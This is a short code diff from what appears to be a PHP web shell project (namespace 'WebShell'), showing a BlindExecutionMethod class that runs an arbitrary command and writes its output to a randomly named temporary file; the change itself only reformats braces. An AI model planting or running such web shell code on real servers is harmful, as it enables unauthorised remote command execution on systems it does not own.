@@ -1,8 +1,10 @@
 <?php
 namespace WebShell;
 
-abstract class BlindExecutionMethod implements ExecutionMethod {
-    public function execute($cmd) {
+abstract class BlindExecutionMethod implements ExecutionMethod
+{
+    public function execute($cmd)
+    {
         // Create a temporary random file and redirect the command output to it
         $fileName = bin2hex(random_bytes(32)) . '.txt';
         $this->run_command($cmd . " > {$fileName} 2>&1");
